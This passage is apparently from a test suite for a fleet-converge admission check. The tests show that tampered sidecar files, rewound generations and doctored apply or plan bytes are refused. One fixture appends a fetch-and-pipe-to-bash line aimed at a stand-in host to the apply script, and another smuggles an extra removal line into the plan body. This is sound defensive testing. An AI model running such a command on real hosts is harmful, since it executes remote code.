  fleet_converge_plan_generation_path,
  fleet_converge_plan_content_hash_path,
}

data live_tree_disposition: LiveTreeDisposition = SubstrateInputsOnly

// THE SUBJECT: apply must not be steerable by any file it reads.
//
// THE ATTACK THIS FILE EXECUTES. The plan writes eight files. plan_content.hex covered three of
// them; subject_scope.txt, subject_host.txt, subject_member_set.txt, observed_baseline.hex and the
// two generation files were covered by nothing. Apply then read the SCOPE out of subject_scope.txt
// and used it for BOTH halves of its own admission -- as the "planned scope" it compared, and as
// the selector deciding which observers built the re-observation it compared AGAINST. A value
// compared only with itself always agrees. So a COORDINATED substitution -- scope, member-set
// fingerprint and baseline replaced together and coherently -- admitted the original, reviewed
// apply.sh under a different re-observation scope, with the bundle hash still matching because none
// of the substituted files was in the bundle.
//
// WHY THESE GO THROUGH fleet_converge_apply_payload_admits RATHER THAN THE PREDICATE UNDERNEATH.
// Calling fleet_converge_apply_artifact_admits directly with arguments of my choosing would test a
// predicate, not the composition -- and the hole was never in that predicate. It was in WHICH
// VALUES production handed it, which is a property of the composition and invisible to any test
// that supplies the arguments itself. This is the function the CLI calls, given the bytes the CLI
// read, judged against the receipt the CLI holds.

data fixture_r: String = "0123456789abcdef0123456789abcdef01234567"
data fixture_member_set: String = "fnv1a64:0011223344556677"
data fixture_baseline: String = "1122334455667788"
data fixture_plan_body: String = "# fleet-converge plan\nsubject_host:srv1\n"
data fixture_apply_shell: String = "set -euo pipefail\n# apply-terminal: FullyApplied\n"

// THE FIXTURE'S BUNDLE HASH IS DERIVED FROM THE FIXTURE'S OWN BYTES BY THE PRODUCTION DIGEST FOLD,
// not transcribed as a literal. A literal here would have to be updated by hand whenever the digest
// scheme moved, and the update would be indistinguishable from silencing a real regression; deriving
// it means the positive control below is asking whether the admission accepts a COHERENT population,
// which is the question, rather than whether someone kept a magic number current.
fn fixture_bundle_hash() -> String {
  match fleet_converge_plan_bundle_digest_hex(
    plan_body: fixture_plan_body,
    apply_shell: fixture_apply_shell,
  ) {
    Present { value: h } => h as String
    Absent => "BUNDLE-DIGEST-UNCOMPUTABLE"
  }
}

data fixture_other_member_set: String = "fnv1a64:8899aabbccddeeff"
data fixture_other_baseline: String = "99aabbccddeeff00"

fn fixture_run() -> ActionsRunBinding {
  ActionsRunBinding {
    repository: "gunb-ai/gunbc",
    workflow_ref: "gunb-ai/gunbc/.github/workflows/fleet-converge.yml@refs/heads/main",
    run_id: "1001",
    run_revision: fixture_r,
  }
}

// THE ANCHOR: a plan receipt minted by the plan run at the launch-environment scope.
fn fixture_receipt_at(scope_wire: String) -> FleetConvergePlanReceipt {
  FleetConvergePlanReceipt {
    run: fixture_run(),
    observed_host: "srv1",
    scope_wire: scope_wire,
    member_set_fingerprint_hex: fixture_member_set,
    plan_artifact_hash: fixture_bundle_hash(),
    observed_baseline_hex: fixture_baseline,
    prior_generation: 4,
    planned_generation: 5,
    lease_key: "fleet-converge-plan:srv1",
    lease_resource_fingerprint: "fnv1a64:aaaaaaaaaaaaaaaa",
    lease_owner_fingerprint: "fnv1a64:bbbbbbbbbbbbbbbb",
    lease_generation: 5,
    apply_terminal: FullyApplied,
  }
}

fn fixture_receipt() -> FleetConvergePlanReceipt {
  fixture_receipt_at(scope_wire: fleet_converge_scope_wire(scope: LaunchEnvironment))
}

// THE HONEST ON-DISK POPULATION: exactly what the plan run wrote.
fn coherent_payload() -> FleetConvergeApplyPayload {
  FleetConvergeApplyPayload {
    subject_host_text: "srv1",
    subject_scope_text: fleet_converge_scope_wire(scope: LaunchEnvironment),
    subject_member_set_text: fixture_member_set,
    observed_baseline_hex_text: fixture_baseline,
    prior_generation_text: "4",
    planned_generation_text: "5",
    plan_body: fixture_plan_body,
    apply_shell: fixture_apply_shell,
    plan_content_hex: fixture_bundle_hash(),
  }
}

fn admission_of(payload: FleetConvergeApplyPayload) -> FleetConvergeApplyPayloadAdmission {
  fleet_converge_apply_payload_admits(receipt: fixture_receipt(), payload: payload)
}

fn is_admitted_routing_launch(a: FleetConvergeApplyPayloadAdmission) -> Bool {
  match a {
    PayloadAdmitted { routed_scope: s } =>
      fleet_converge_scope_wire(scope: s) == fleet_converge_scope_wire(scope: LaunchEnvironment)
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

fn diverged_field(a: FleetConvergeApplyPayloadAdmission) -> String {
  match a {
    PayloadSidecarDiverged { field: f, receipt_value: _, on_disk_value: _ } => f
    PayloadAdmitted { routed_scope: _ } => "admitted"
    PayloadScopeUndecodableInReceipt { cause: _ } => "scope-undecodable"
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => "generation-corrupt"
    PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => "bundle-mismatch"
    PayloadDigestUncomputable { path: _ } => "digest-uncomputable"
  }
}

// THE PAIRED POSITIVE. Without it every red below could be red by vacancy -- an admission that
// refused everything would satisfy all of them.
test fn an_untouched_artifact_population_is_admitted_and_routes_on_the_receipt_scope() -> Bool {
  is_admitted_routing_launch(a: admission_of(payload: coherent_payload()))
}

// THE COORDINATED OTHER-SCOPE SUBSTITUTION -- THE ATTACK ITSELF.
//
// The reviewed payload is held BYTE-FOR-BYTE FIXED, the bundle hash still matches, and the three
// subject sidecars are replaced together and COHERENTLY so that they agree with each other exactly
// as a genuine full-host plan's would. Under the old composition this admitted: the substituted
// scope selected the observers, and the substituted fingerprint and baseline were computed over
// that same substituted scope, so every comparison agreed. It now refuses, because the scope apply
// routes on comes from the run-bound receipt and the files are checked AGAINST it rather than
// trusted BY it.
fn coordinated_full_host_substitution() -> FleetConvergeApplyPayload {
  FleetConvergeApplyPayload {
    subject_host_text: "srv1",
    subject_scope_text: fleet_converge_scope_wire(scope: FullHost),
    subject_member_set_text: fixture_other_member_set,
    observed_baseline_hex_text: fixture_other_baseline,
    prior_generation_text: "4",
    planned_generation_text: "5",
    plan_body: fixture_plan_body,
    apply_shell: fixture_apply_shell,
    plan_content_hex: fixture_bundle_hash(),
  }
}

test fn a_coordinated_other_scope_substitution_refuses_before_any_observation() -> Bool {
  let a = admission_of(payload: coordinated_full_host_substitution())
  !is_admitted_routing_launch(a: a)
    && diverged_field(a: a) == fleet_converge_plan_subject_scope_path
}

// AND EACH SIDECAR ALONE, so the coordinated refusal above cannot be passing for a reason that
// would also fire on an honest population -- and so a future edit that stops checking one of them
// is named rather than absorbed by the others.
test fn a_substituted_member_set_fingerprint_alone_refuses() -> Bool {
  let p = coherent_payload()
  diverged_field(a: admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: fixture_other_member_set,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  })) == fleet_converge_plan_member_set_fp_path
}

test fn a_substituted_baseline_digest_alone_refuses() -> Bool {
  let p = coherent_payload()
  diverged_field(a: admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: fixture_other_baseline,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  })) == fleet_converge_plan_baseline_hex_path
}

test fn a_substituted_subject_host_alone_refuses() -> Bool {
  let p = coherent_payload()
  diverged_field(a: admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: "srv2",
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  })) == fleet_converge_plan_subject_host_path
}

// A REWOUND GENERATION IS A REPLAY, not drift: it is how a spent plan is presented as unspent.
test fn a_rewound_generation_sidecar_refuses() -> Bool {
  let p = coherent_payload()
  diverged_field(a: admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: "3",
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  })) == fleet_converge_plan_prior_generation_path
}

// A CORRUPT GENERATION FILE IS ITS OWN ARM, never coerced to zero.
test fn a_corrupt_generation_sidecar_refuses_rather_than_coercing() -> Bool {
  let p = coherent_payload()
  match admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: "not-a-number",
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  }) {
    PayloadGenerationTextCorrupt { field: f, on_disk_value: _ } =>
      f == fleet_converge_plan_prior_generation_path
    PayloadAdmitted { routed_scope: _ } => false
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

test fn a_bundle_hash_that_disagrees_with_the_receipt_refuses() -> Bool {
  let p = coherent_payload()
  match admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: p.apply_shell,
    plan_content_hex: "deadbeefdeadbeef",
  }) {
    PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
      r == fixture_bundle_hash() && o == "deadbeefdeadbeef"
    PayloadAdmitted { routed_scope: _ } => false
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

// AN UNDECODABLE SCOPE IN THE RECEIPT STOPS THE LINE BEFORE ANY OBSERVER IS SELECTED, and it is
// the RECEIPT that must be decodable now -- not the file. This is the version-skew arm: a receipt
// minted by a build that spelled scopes differently.
test fn a_receipt_naming_an_undecodable_scope_selects_no_observer() -> Bool {
  match fleet_converge_apply_payload_admits(
    receipt: fixture_receipt_at(scope_wire: "full_host"),
    payload: coherent_payload(),
  ) {
    PayloadScopeUndecodableInReceipt { cause: _ } => true
    PayloadAdmitted { routed_scope: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

// THE ROUTED SCOPE COMES FROM THE RECEIPT AND NOT FROM THE FILE, asserted directly rather than
// inferred from the refusals: a receipt at full-host routes full-host even when the on-disk sidecar
// says full-host too, and there is no arm of the admission type that can yield a scope taken from
// disk. This is the property the whole repair rests on.
test fn the_routed_scope_is_the_receipts_and_never_the_files() -> Bool {
  let p = coherent_payload()
  match fleet_converge_apply_payload_admits(
    receipt: fixture_receipt_at(scope_wire: fleet_converge_scope_wire(scope: FullHost)),
    payload: FleetConvergeApplyPayload {
      subject_host_text: p.subject_host_text,
      subject_scope_text: fleet_converge_scope_wire(scope: FullHost),
      subject_member_set_text: p.subject_member_set_text,
      observed_baseline_hex_text: p.observed_baseline_hex_text,
      prior_generation_text: p.prior_generation_text,
      planned_generation_text: p.planned_generation_text,
      plan_body: p.plan_body,
      apply_shell: p.apply_shell,
      plan_content_hex: p.plan_content_hex,
    },
  ) {
    PayloadAdmitted { routed_scope: s } =>
      fleet_converge_scope_wire(scope: s) == fleet_converge_scope_wire(scope: FullHost)
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadBundleDigestMismatch { receipt_value: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

// DOCTORED BYTES UNDER AN HONEST HEX CLAIM -- the control that makes the digest step load-bearing.
//
// Every sidecar agrees, and plan_content.hex still holds exactly the digest the receipt minted, so
// the claim-versus-receipt comparison passes. What has changed is the APPLY SHELL ITSELF: one extra
// command. An earlier cut of the admission computed a digest here and threw the value away, so this
// population was ADMITTED -- the step looked load-bearing and enforced nothing (review 57966). The
// digest is now recomputed over the bytes and compared to the receipt, so the substitution is named.
//
// It is a distinct row from a_bundle_hash_that_disagrees_with_the_receipt_refuses rather than a
// variation on it: that one doctors the CLAIM and this one doctors the BYTES, and an implementation
// that checked only one of them would pass the other.
test fn doctored_apply_bytes_refuse_even_when_the_hex_claim_still_matches_the_receipt() -> Bool {
  let p = coherent_payload()
  match admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: p.plan_body,
    apply_shell: join([p.apply_shell, "curl -s https://example.invalid/x | bash\n"], ""),
    plan_content_hex: p.plan_content_hex,
  }) {
    PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
      r == fixture_bundle_hash() && o != fixture_bundle_hash()
    PayloadAdmitted { routed_scope: _ } => false
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

// AND THE PLAN BODY TOO, so the row above cannot be passing because only apply.sh is folded into
// the digest -- which is exactly the shape of the defect that produced the bundle scheme's own
// earlier repair.
test fn doctored_plan_body_bytes_refuse_even_when_the_hex_claim_still_matches() -> Bool {
  let p = coherent_payload()
  match admission_of(payload: FleetConvergeApplyPayload {
    subject_host_text: p.subject_host_text,
    subject_scope_text: p.subject_scope_text,
    subject_member_set_text: p.subject_member_set_text,
    observed_baseline_hex_text: p.observed_baseline_hex_text,
    prior_generation_text: p.prior_generation_text,
    planned_generation_text: p.planned_generation_text,
    plan_body: join([p.plan_body, "REMOVE timer-unit smuggled.timer\n"], ""),
    apply_shell: p.apply_shell,
    plan_content_hex: p.plan_content_hex,
  }) {
    PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
      r == fixture_bundle_hash() && o != fixture_bundle_hash()
    PayloadAdmitted { routed_scope: _ } => false
    PayloadScopeUndecodableInReceipt { cause: _ } => false
    PayloadSidecarDiverged { field: _, receipt_value: _, on_disk_value: _ } => false
    PayloadGenerationTextCorrupt { field: _, on_disk_value: _ } => false
    PayloadDigestUncomputable { path: _ } => false
  }
}

// ---------------------------------------------------------------------------
// THE PERSISTED-MEMBER MAP, JOINED TO THE BEHAVIOUR IT DESCRIBES.
//
// The classification is only worth having if it cannot drift from what the admission actually does.
// A roster that says "subject_scope.txt is receipt-bound" while the admission quietly stopped
// comparing it would be a parallel ledger -- the exact shape DESIGN warns about, and the shape the
// PR body's table would have been on its own. So these rows assert BOTH halves together: the
// classification says receipt-bound, AND a divergence in that member produces a refusal naming that
// same path.
// ---------------------------------------------------------------------------

fn classifies_receipt_bound_to(path: String, receipt_field: String) -> Bool {
  match fleet_converge_persisted_member_authority(path: path) {
    PersistedMemberClassified { path: p, authority: a } =>
      p == path
        && match a {
             ReceiptBoundMember { receipt_field: f } => f == receipt_field
             DerivedFromBoundAuthority { recomputed_into: _ } => false
             NonAuthoritativePresentation { justification: _ } => false
           }
    UnclassifiedPersistedMember { path: _ } => false
  }
}

fn classifies_derived_into(path: String, recomputed_into: String) -> Bool {
  match fleet_converge_persisted_member_authority(path: path) {
    PersistedMemberClassified { path: p, authority: a } =>
      p == path
        && match a {
             DerivedFromBoundAuthority { recomputed_into: r } => r == recomputed_into
             ReceiptBoundMember { receipt_field: _ } => false
             NonAuthoritativePresentation { justification: _ } => false
           }
    UnclassifiedPersistedMember { path: _ } => false
  }
}

fn is_classified(path: String) -> Bool {
  match fleet_converge_persisted_member_authority(path: path) {
    PersistedMemberClassified { path: _, authority: _ } => true
    UnclassifiedPersistedMember { path: _ } => false
  }
}

// EVERY MEMBER THE PLAN WRITES IS CLASSIFIED. Asserted over the roster rather than one path at a
// time, so a member added to the roster without a classification arm is red here rather than
// discovered by whoever next reads the fold.
//
// THE ROSTER LENGTH IS NOT ASSERTED, AND AN EARLIER CUT ASSERTED IT AT TEN. That literal was a
// measurement of the same tree it was checking -- automate its update and the row collapses to
// measure() == measure(), which is the change-detector DESIGN forbids as an oracle (review 57997).
// The identity join below is the whole content of the row. Non-vacuity is still required, because
// `all` over an empty roster is true for free and a roster that silently stopped being populated
// would satisfy this row without classifying anything.
test fn every_rostered_persisted_member_is_classified() -> Bool {
  list_length(items: fleet_converge_persisted_member_paths) > 0
    && all(fleet_converge_persisted_member_paths, p => is_classified(path: p))
}

// EVERY ROSTERED IDENTITY APPEARS EXACTLY ONCE, and this row exists because the classification join
// above CANNOT SEE A DUPLICATE. It requires only that the roster is nonempty and that every
// occurrence classifies, so repeating a path that is already classified satisfies it BY
// CONSTRUCTION -- the witness passes for a reason unrelated to the property it names. That is not
// hypothetical: this PR inserted a second fleet_converge_plan_content_hash_path into this roster
// while adding a missing import, every row here stayed green, and a reader caught it rather than
// the gate.
//
// It matters because the roster claims to be a MAP. The authority's own annotation says the
// classification and this list together are "a closed map rather than a lookup nobody enumerates",
// joined at identity grain -- and an identity appearing twice is not a harmless bag entry, it means
// the population the map is over is not what the map says it is.
//
// THE RUNG THIS REACHES IS MECHANICALLY ENFORCED AND NOT STRUCTURAL, said here because the word
// "wall" invites the higher reading. The roster is a List<String>, so a repeated identity stays
// perfectly WRITABLE and safety depends on this row executing and staying enrolled. Construction
// would mean a carrier whose type cannot express a second occurrence of one identity at all, and
// calling a raw list "a closed map" does not elevate it -- a name is not a constructor. The
// next-rung trigger, named as the capability rather than as an artifact: a keyed-roster carrier
// whose construction admits at most one member per identity, so that the duplicate this row
// catches has nowhere to be written.
//
// NO LENGTH LITERAL, DELIBERATELY, for the same reason the row above refuses one: a count copied
// from the tree it checks collapses to measure() == measure(). Multiplicity is asserted per
// identity instead -- each member occurs exactly once in the roster -- which is a property of the
// list rather than a snapshot of its size, and which reddens on a duplicate of an ALREADY-PRESENT
// path, the case a length literal would also catch but only until someone updated it.
fn occurs_exactly_once(path: String, roster: List<String>) -> Bool {
  count_where(xs: roster, predicate: fn(p) { p == path }) == 1
}

test fn no_persisted_member_path_is_rostered_twice() -> Bool {
  list_length(items: fleet_converge_persisted_member_paths) > 0
    && all(fleet_converge_persisted_member_paths, p =>
        occurs_exactly_once(path: p, roster: fleet_converge_persisted_member_paths))
}

// THE MUTATION CONTROL, so the zero above is a measurement and not a blind spot. The predicate is
// run against the REAL roster with one existing identity repeated -- the exact defect this PR
// committed -- and must refuse it. Without this row, "no duplicates" would be indistinguishable
// from a check that cannot see one.
data roster_with_one_identity_repeated: List<String> = concat(
  fleet_converge_persisted_member_paths,
  [fleet_converge_plan_content_hash_path],
)

test fn a_repeated_existing_identity_is_refused_by_the_uniqueness_wall() -> Bool {
  !all(roster_with_one_identity_repeated, p =>
      occurs_exactly_once(path: p, roster: roster_with_one_identity_repeated))
}

// THE DISCRIMINATING RED, and the reason the fold has no default arm. An unrecognized path is
// UnclassifiedPersistedMember, so an eleventh sidecar added without classifying it fails loudly
// instead of silently acquiring whatever category the last `else` happened to name. Without this
// row the "no fourth category" property would be a reading of the source rather than a wall.
test fn an_unrecognized_persisted_path_is_refused_rather_than_defaulted() -> Bool {
  match fleet_converge_persisted_member_authority(
    path: "/tmp/fleet-converge-plan/an_eleventh_sidecar_nobody_classified.txt",
  ) {
    UnclassifiedPersistedMember { path: p } =>
      p == "/tmp/fleet-converge-plan/an_eleventh_sidecar_nobody_classified.txt"
    PersistedMemberClassified { path: _, authority: _ } => false
  }
}

// THE MAP AGREES WITH THE ADMISSION, member by member, for every category-1 sidecar this file can
// diverge independently. Each conjunct pairs the CLASSIFICATION with the EXECUTED refusal that
// names the same path, so the two cannot drift apart without a red.
test fn the_receipt_bound_classification_matches_the_executed_refusal() -> Bool {
  let p = coherent_payload()
  classifies_receipt_bound_to(path: fleet_converge_plan_subject_host_path, receipt_field: "observed_host")
    && diverged_field(a: admission_of(payload: FleetConvergeApplyPayload {
         subject_host_text: "srv2",
         subject_scope_text: p.subject_scope_text,
         subject_member_set_text: p.subject_member_set_text,
         observed_baseline_hex_text: p.observed_baseline_hex_text,
         prior_generation_text: p.prior_generation_text,
         planned_generation_text: p.planned_generation_text,
         plan_body: p.plan_body,
         apply_shell: p.apply_shell,
         plan_content_hex: p.plan_content_hex,
       })) == fleet_converge_plan_subject_host_path
    && classifies_receipt_bound_to(path: fleet_converge_plan_subject_scope_path, receipt_field: "scope_wire")
    && diverged_field(a: admission_of(payload: coordinated_full_host_substitution()))
         == fleet_converge_plan_subject_scope_path
    && classifies_receipt_bound_to(
         path: fleet_converge_plan_member_set_fp_path,
         receipt_field: "member_set_fingerprint_hex",
       )
    && classifies_receipt_bound_to(
         path: fleet_converge_plan_baseline_hex_path,
         receipt_field: "observed_baseline_hex",
       )
    && classifies_receipt_bound_to(
         path: fleet_converge_plan_prior_generation_path,
         receipt_field: "prior_generation",
       )
    && classifies_receipt_bound_to(
         path: fleet_converge_plan_generation_path,
         receipt_field: "planned_generation",
       )
    && classifies_receipt_bound_to(
         path: fleet_converge_plan_content_hash_path,
         receipt_field: "plan_artifact_hash",
       )
}

// AND THE DERIVED MEMBERS NAME THE VALUE THEY ARE RECOMPUTED INTO. Both ride one digest, which
// is why doctoring any of their bytes surfaces as a bundle mismatch against the receipt rather than
// as a per-file comparison -- the map says derived, and that is exactly what the executed rows
// doctored_apply_bytes_* and doctored_plan_body_bytes_* observe.
test fn the_derived_classification_names_the_bound_value_it_is_recomputed_into() -> Bool {
  classifies_derived_into(path: fleet_converge_plan_body_path, recomputed_into: "plan_artifact_hash")
    && classifies_derived_into(path: fleet_converge_plan_apply_shell_path, recomputed_into: "plan_artifact_hash")
}

// CATEGORY THREE IS EMPTY, EXECUTED RATHER THAN ASSERTED IN PROSE. An empty set has two causes --
// nothing qualified, or nothing was asked -- and this row settles which: every rostered member is
// asked, and none answers NonAuthoritativePresentation.
test fn no_persisted_member_is_currently_non_authoritative() -> Bool {
  all(
    fleet_converge_persisted_member_paths,
    p => match fleet_converge_persisted_member_authority(path: p) {
      PersistedMemberClassified { path: _, authority: a } =>
        match a {
          NonAuthoritativePresentation { justification: _ } => false
          ReceiptBoundMember { receipt_field: _ } => true
          DerivedFromBoundAuthority { recomputed_into: _ } => true
        }
      UnclassifiedPersistedMember { path: _ } => false
    },
  )
}
